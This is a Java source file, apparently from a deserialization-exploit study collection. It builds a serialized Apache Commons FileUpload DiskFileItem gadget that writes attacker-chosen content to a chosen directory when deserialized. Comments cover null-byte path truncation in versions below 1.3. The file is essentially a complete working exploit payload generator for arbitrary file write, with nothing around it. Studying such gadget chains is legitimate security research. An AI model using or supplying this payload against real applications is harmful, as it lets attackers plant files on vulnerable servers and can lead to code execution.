package FileUpload;


/**
 *https://su18.org/post/ysoserial-su18-4/
 * DiskFileItem.readObject()
 *     DiskFileItem.getOutputStream()
 *             DeferredFileOutputStream.write()
 */
import Tools.SerializeUtil;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import java.io.File;
import java.lang.reflect.Field;

public class FileUploadForWrite {
    public static String fileName = "FileUploadForWrite.bin";

    public static void main(String[] args) throws Exception {
        // 在 1.3 版本以下，可以使用 \0 截断 jdk<7
        File repository = new File("d:/aaa");
        // 在 1.3.1 及以上，只能指定目录
        //File   repository = new File("/Users/phoebe/Downloads");
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
        // 使用 repository 初始化反序列化的 DiskFileItem 对象  写入大于阈值 写入硬盘
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
        // 序列化时 writeObject 要求 dfos 不能为 null
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);
        // 反射将 cachedContent 写入
        String content = "firebasddddddddddddddddddddddddddddddddddddddddddddasky";
        byte[] bytes   = content.getBytes("UTF-8");
        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem, bytes);
        //
        SerializeUtil.writeObjectToFile(diskFileItem, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
